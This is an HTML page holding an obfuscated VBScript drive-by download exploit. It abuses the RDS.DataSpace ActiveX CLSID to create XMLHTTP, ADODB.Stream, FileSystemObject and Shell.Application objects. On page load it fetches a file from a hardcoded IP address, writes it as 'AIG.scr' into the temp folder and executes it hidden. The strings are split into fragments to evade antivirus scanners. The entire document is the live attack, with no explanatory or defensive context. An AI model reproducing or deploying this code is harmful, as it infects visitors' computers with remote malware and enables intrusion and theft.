    <html>
    <script language="VBScript">
    on error resume next
    errreplurl = "http://61.160.213.143/wl.css"
    errrepl="o"&"bj"&"ec"&"t"
    errrepl2="c"&"la"&"s"&"si"&"d"
    evil="C"&"5"&"5"&"6"&"-"&"6"&"5"&"A"&"3"&"-"
    evils="c"&"l"&"si"&"d"&":"&"B"&"D9"&"6"
    evilx=evils & evil &"1"&"1"&"D"&"0"&"-"&"9"&"8"&"3"&"A"&"-"&"0"&"0"&"C"&"0"&"4"&"F"&"C"&"2"&"9"&"E"&"3"&"6"
    errrepl3="M"&"ic"&"ro"&"so"&"ft"&".X"&"M"&"L"&"HT"&"T"&"P"
    errrepl4="Shell.Application"
    errrepl5="Sc"&"ri"&"p"&"ti"&"n"&"g.Fi"&"l"&"eSys"&"tem"&"Ob"&"je"&"ct"
    Set evilcute = document.createElement(errrepl)
    sub usicecod(errrepl4,errreplx)
    set evilcutes = evilcute.createobject(errrepl4,"")
    evilcutes.ShellExEcutE evilcutex,"","","o"&"p"&"e"&"n",0
    end sub
    evilcute.setAttribute errrepl2, evilx
    chilam=errrepl3
    Set wing = evilcute.CreateObject(chilam,"")
    Anhey="A"&"d"&"o"&"d"&"b"&"."
    Anheys="S"&"t"&"r"
    Anheyx="e"&"a"&"m"
    User="andhi"
    Anti = Anhey & Anheys & Anheyx
    Antivirus = Anti
    set Rising = evilcute.createobject(Antivirus,"")
    Rising.type = 1
    Kaspersky="G"&"E"&"T"
    wing.Open Kaspersky, errreplurl, False
    wing.Send
    evilcutex="AIG.scr"
    SeT Virus = evilcute.createobject(errrepl5,"")
    sET evilcutes = Virus.GetSpecialFolder(2)
    Rising.open
    evilcutex= Virus.BuildPath(evilcutes,evilcutex)
    Rising.write wing.responseBody
    Rising.savetofile evilcutex,2
    Rising.close
    call usicecod(errrepl4,errreplx)
    </script>
